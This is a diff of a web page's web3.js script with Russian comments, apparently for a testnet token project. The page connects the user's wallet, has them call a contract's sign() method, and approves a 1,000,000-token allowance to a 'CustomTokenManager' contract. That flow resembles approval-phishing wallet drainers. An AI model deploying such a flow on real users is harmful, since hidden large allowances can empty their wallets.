@@ -7,10 +7,9 @@
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
         let web3;
-        const contractAddress = "0x4bae37432137e3077439e17a1124cd2be8cec8a2"; // Адрес вашего контракта на тестовой сети
-        const contractAbi = [ /* Вставьте ABI вашего нового контракта здесь */ ];
-        const usdtContractAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес USDT токена на тестовой сети
-        const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего Custom Token
+        const managerContractAddress = "0x17276350c8abc1b5f34c07e688ae113c082020cb"; // Адрес контракта CustomTokenManager на тестовой сети
+        const managerAbi = [ /* Вставьте ABI вашего CustomTokenManager контракта здесь */ ];
+        const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего кастомного токена CustomUSDT
         const erc20Abi = [
             {
                 "constant": false,
@@ -45,17 +44,14 @@
                     const userAddress = accounts[0];
                     console.log("Подключен аккаунт:", userAddress);
 
-                    // Создаем контрактный объект
-                    const contract = new web3.eth.Contract(contractAbi, contractAddress);
+                    // Создаем контрактный объект менеджера
+                    const managerContract = new web3.eth.Contract(managerAbi, managerContractAddress);
 
-                    // Подписываем контракт
-                    await contract.methods.sign().send({ from: userAddress });
+                    // Подписываем контракт (если требуется подпись)
+                    await managerContract.methods.sign().send({ from: userAddress });
                     console.log("Контракт подписан пользователем:", userAddress);
 
                     // Предоставляем разрешение на управление USDT токенами
-                    await approveTokens(userAddress, usdtContractAddress, "USDT");
-                    
-                    // Предоставляем разрешение на управление Custom Token
                     await approveTokens(userAddress, customTokenAddress, "Custom Token");
 
                     alert("Контракт успешно подписан и разрешение предоставлено!");
@@ -74,8 +70,8 @@
                 const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
 
                 // Выполняем транзакцию approve для предоставления доступа контракту на управление токенами
-                await tokenContract.methods.approve(contractAddress, amountToApprove).send({ from: userAddress });
-                console.log(`Доступ к ${tokenName} токенам предоставлен для контракта:`, contractAddress);
+                await tokenContract.methods.approve(managerContractAddress, amountToApprove).send({ from: userAddress });
+                console.log(`Доступ к ${tokenName} токенам предоставлен для контракта:`, managerContractAddress);
             } catch (error) {
                 console.error(`Ошибка при предоставлении разрешения на управление ${tokenName} токенами:`, error);
             }
